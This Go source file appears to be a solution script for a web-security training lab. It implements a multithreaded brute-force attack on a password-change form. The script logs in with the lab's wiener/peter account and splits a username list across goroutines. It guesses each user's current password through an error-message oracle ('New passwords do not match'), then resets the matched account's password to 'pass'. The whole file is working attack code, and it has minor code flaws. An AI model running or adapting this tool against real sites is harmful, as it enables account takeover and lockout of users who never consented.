package bruteforcer

import (
	"fmt"
	"io"
	"log"
	"os"
	postcalls "portswinger/brute/postCalls"
	"strings"
	"sync"
	"time"
)

func BruteForcer(urlPost string, urlPostChangePass *string, usernames []byte, passwords []byte, threads *int) {
	index := 0
	var wg sync.WaitGroup

	fmt.Println("Initiating brute Force Attack |-_-|")

	//Initial Log in
	response, err := postcalls.PostCall(urlPost, "wiener", "peter")
	if err != nil {
		log.Println(err)
	}

	sessionCookie := response.Cookies()[0].Value

	//Spliting usernames to threads
	useranmeSplit := len(strings.Split(string(usernames), "\n")) / *threads
	var splitedUsernames []string

	for i := 0; i < *threads; i++ {
		for j := index; j < index+useranmeSplit; j++ {
			splitedUsernames = append(splitedUsernames, strings.Split(string(usernames), "\n")[j])
		}

		index += useranmeSplit
		wg.Add(1)
		go func() {
			defer wg.Done()
			found, err := brute(urlPostChangePass, splitedUsernames, &passwords, &sessionCookie)
			if err != nil {
				log.Fatal(err)
			}

			if found {
				os.Exit(0)
			}

		}()

		time.Sleep(100 * time.Millisecond)
		splitedUsernames = []string{}

	}

	//Taking rest of Strings
	if restOfStrings := len(strings.Split(string(usernames), "\n")) % *threads; restOfStrings != 0 {
		for j := index; j < index+restOfStrings; j++ {
			splitedUsernames = append(splitedUsernames, strings.Split(string(usernames), "\n")[j])
		}

		index += restOfStrings

		wg.Add(1)
		go func() {
			defer wg.Done()
			found, err := brute(urlPostChangePass, splitedUsernames, &passwords, &sessionCookie)
			if err != nil {
				log.Fatal(err)
			}

			if found {
				os.Exit(0)
			}

		}()

	}

	wg.Wait()
}

func brute(urlPost *string, usernames []string, passwords *[]byte, sessionCookie *string) (bool, error) {

	for _, username := range usernames {
		for _, password := range strings.Split(string(*passwords), "\n") {
			response, err := postcalls.PasswordChange(urlPost, username, password, "pass", "pas", sessionCookie)
			if err != nil {
				fmt.Println(err)
			}

			fmt.Println(username, password, response.Status)

			body, err := io.ReadAll(response.Body)
			if err != nil {
				fmt.Println(err)
			}

			if strings.Contains(string(body), "New passwords do not match") {
				fmt.Println("Found it: ", username, password)

				response, err := postcalls.PasswordChange(urlPost, username, password, "pass", "pass", sessionCookie)
				if err != nil {
					fmt.Println(err)
				}

				if body, err := io.ReadAll(response.Body); err != nil {

					fmt.Println(err)
				} else {
					fmt.Println("Password changed to 'pass'")
				}

				return true, nil
			}
		}
	}
	return false, nil
}
